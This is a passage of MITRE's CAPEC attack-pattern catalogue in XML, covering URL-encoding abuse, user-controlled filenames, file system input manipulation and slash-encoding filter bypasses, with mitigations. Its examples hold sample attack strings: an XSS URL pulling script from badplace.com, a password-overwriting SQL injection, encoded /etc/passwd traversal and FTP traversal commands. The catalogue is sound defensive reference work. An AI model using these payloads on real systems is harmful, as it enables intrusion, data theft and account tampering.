            <ns0:Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:b>URL Encodings in IceCast MP3 Server.</html:b>
               <html:p>The following type of encoded string has been known traverse directories against the IceCast MP3 server9:</html:p>
               <html:div style="margin-left:1em;" class="informative">http://[targethost]:8000/somefile/%2E%2E/target.mp3</html:div>
               <html:p>or using</html:p>
               <html:div style="margin-left:1em;" class="informative">"/%25%25/" instead of "/../".</html:div>
               <html:p>The control character ".." can be used by an adversary to escape the document root.</html:p>See also: CVE-2001-0784</ns0:Example>
            <ns0:Example>
               <html:b>Cross-Site Scripting</html:b>
               <html:div style="margin-left:1em;" class="attack">
                  <html:b>URL-Encoded attack:</html:b>http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e</html:div>
               <html:div style="margin-left:1em;" class="result">
                  <html:b>HTML execution:</html:b>&lt;script src="http://www.badplace.com/nasty.js"&gt;&lt;/script&gt;</html:div>
               <html:p>[REF-495]</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:b>SQL Injection</html:b>
               <html:div style="margin-left:1em;" class="informative">
                  <html:b>Original database query in the example file - "login.asp":</html:b>SQLQuery = "SELECT preferences FROM logintable WHERE userid='" &amp; Request.QueryString("userid") &amp; "' AND password='" &amp; Request.QueryString("password") &amp; "';"</html:div>
               <html:div style="margin-left:1em;" class="attack">
                  <html:b>URL-encoded attack:</html:b>http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00</html:div>
               <html:div style="margin-left:1em;" class="result">
                  <html:b>Executed database query:</html:b>SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';</html:div>
               <html:p>From "URL encoded attacks", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:b>Combined Encodings CesarFTP</html:b>
               <html:p>Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks.</html:p>
               <html:p>An adversary could provide a URL that included a string like</html:p>
               <html:div style="margin-left:1em;" class="informative">/...%5C/</html:div>
               <html:p>This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.</html:p>See also: CVE-2001-1335</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="177" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-495" />
            <ns0:Reference External_Reference_ID="REF-496" />
            <ns0:Reference External_Reference_ID="REF-497" />
            <ns0:Reference External_Reference_ID="REF-498" />
            <ns0:Reference External_Reference_ID="REF-499" />
            <ns0:Reference External_Reference_ID="REF-500" Section="5.11.4. Validating Hypertext Links (URIs/URLs)" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Indicators, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Extended_Description, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="73" Name="User-Controlled Filename" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="165" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="592" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The victim must trust the name and locale of user controlled filenames.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename</ns0:Skill>
            <ns0:Skill Level="Medium">Deploying a malicious "look-a-like" site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use browser technologies that do not allow client side scripting.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform input validation for all remote content.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform output validation for all remote content.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Scan dynamically generated content against validation specification</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="96" />
            <ns0:Related_Weakness CWE_ID="348" />
            <ns0:Related_Weakness CWE_ID="116" />
            <ns0:Related_Weakness CWE_ID="350" />
            <ns0:Related_Weakness CWE_ID="86" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="76" Name="Manipulating Web Input to File System Calls" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="126" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is so that the proper file seperator is used.</ns0:Description>
               <ns0:Technique>Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</ns0:Technique>
               <ns0:Technique>TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.</ns0:Technique>
               <ns0:Technique>Induce errors to find informative error messages</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user</ns0:Description>
               <ns0:Technique>Spider web sites for all available links, entry points to the web site.</ns0:Technique>
               <ns0:Technique>Manually explore application and inventory all application inputs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application</ns0:Description>
               <ns0:Technique>Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.)</ns0:Technique>
               <ns0:Technique>Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests</ns0:Technique>
               <ns0:Technique>Inject context-appropriate malicious file system control syntax</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)</ns0:Description>
               <ns0:Technique>The attacker injects context-appropriate malicious file path to access the content of the targeted file.</ns0:Technique>
               <ns0:Technique>The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.</ns0:Technique>
               <ns0:Technique>The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.</ns0:Technique>
               <ns0:Technique>The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.</ns0:Technique>
               <ns0:Technique>The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.</ns0:Technique>
               <ns0:Technique>The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Program must allow for user controlled variables to be applied directly to the filesystem</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To identify file system entry point and execute against an over-privileged system interface</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Enforce principle of least privilege.</ns0:Mitigation>
            <ns0:Mitigation>Design: Ensure all input is validated, and does not contain file system commands</ns0:Mitigation>
            <ns0:Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</ns0:Mitigation>
            <ns0:Mitigation>Design: For interactive user applications, consider if direct file system interface is necessary, instead consider having the application proxy communication.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file.</html:p>
               <html:div style="margin-left:1em;" class="attack">http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd</html:div>
               <html:p>However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string.</html:p>
               <html:p>Then an attacker creates special payloads to bypass this filter:</html:p>
               <html:div style="margin-left:1em;" class="attack">http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd</html:div>
               <html:p>When the application gets this input string, it will be the desired vector by the attacker.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="23" />
            <ns0:Related_Weakness CWE_ID="22" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="77" />
            <ns0:Related_Weakness CWE_ID="346" />
            <ns0:Related_Weakness CWE_ID="348" />
            <ns0:Related_Weakness CWE_ID="285" />
            <ns0:Related_Weakness CWE_ID="272" />
            <ns0:Related_Weakness CWE_ID="59" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="15" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Examples-Instances, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Manipulating Input to File System Calls</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="78" Name="Using Escaped Slashes in Alternate Encoding" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets the use of the backslash in alternate encoding. An adversary can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the adversary tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and attempts to escape multiple different special characters using a backslash.</ns0:Description>
               <ns0:Technique>Escape a special character with a backslash to bypass input validation.</ns0:Technique>
               <ns0:Technique>Try different encodings of both the backslash and the special character to see if this bypasses input validation</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Manipulate input] Once the adversary determines how to bypass filters that filter out special characters using an escaped slash, they will manipulate the user input in a way that is not intended by the application.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application accepts the backlash character as escape character.</ns0:Prerequisite>
            <ns0:Prerequisite>The application server does incomplete input data decoding, filtering and validation.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">The adversary can naively try backslash character and discover that the target host uses it as escape character.</ns0:Skill>
            <ns0:Skill Level="Medium">The adversary may need deep understanding of the host target in order to exploit the vulnerability. The adversary may also use automated tools to probe for this vulnerability.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>An adversary can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Verify that the user-supplied data does not use backslash character to escape malicious characters.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.</ns0:Mitigation>
            <ns0:Mitigation>Be aware of the threat of alternative method of data encoding.</ns0:Mitigation>
            <ns0:Mitigation>Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.</ns0:Mitigation>
            <ns0:Mitigation>In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.</ns0:Mitigation>
            <ns0:Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</ns0:Mitigation>
            <ns0:Mitigation>Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>For example, the byte pair \0 might result in a single zero byte (a NULL) being sent. Another example is \t, which is sometimes converted into a tab character. There is often an equivalent encoding between the back slash and the escaped back slash. This means that \/ results in a single forward slash. A single forward slash also results in a single forward slash. The encoding looks like this:</html:p>
               <html:div style="margin-left:1em;" class="informative">/ yields /<html:br />\/ yields /</html:div>
            </ns0:Example>
            <ns0:Example>
               <html:p>An attack leveraging escaped slashes in slternate encodings is very simple. If you believe the target may be filtering the slash, attempt to supply \/ and see what happens. Example command strings to try out include</html:p>
               <html:div style="margin-left:1em;" class="informative">CWD ..\/..\/..\/..\/winnt</html:div>
               <html:p>which converts in many cases to</html:p>
               <html:div style="margin-left:1em;" class="informative">CWD ../../../../winnt</html:div>
               <html:p>To probe for this kind of problem, a small C program that uses string output routines can be very useful. File system calls make excellent testing fodder. The simple snippet</html:p>
               <html:div style="margin-left:1em;" class="informative">int main(int argc, char* argv[])<html:br />{<html:div style="margin-left:1em;">puts("\/ \\ \? \. \| ");<html:br />return 0;</html:div>
                  <html:br />}</html:div>
               <html:p>produces the output</html:p>
               <html:div style="margin-left:1em;" class="informative">/ \ ? . |</html:div>
               <html:p>Clearly, the back slash is ignored, and thus we have hit on a number of alternative encodings to experiment with. Given our previous example, we can extend the attack to include other possibilities:</html:p>
               <html:div style="margin-left:1em;" class="informative">CWD ..\?\?\?\?\/..\/..\/..\/winnt<html:br />CWD \.\.\/\.\.\/\.\.\/\.\.\/winnt<html:br />CWD ..\|\|\|\|\/..\/..\/..\/winnt</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="22" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Indicators, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="79" Name="Using Slashes in Alternate Encoding" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets the encoding of the Slash characters. An adversary would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the adversary many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
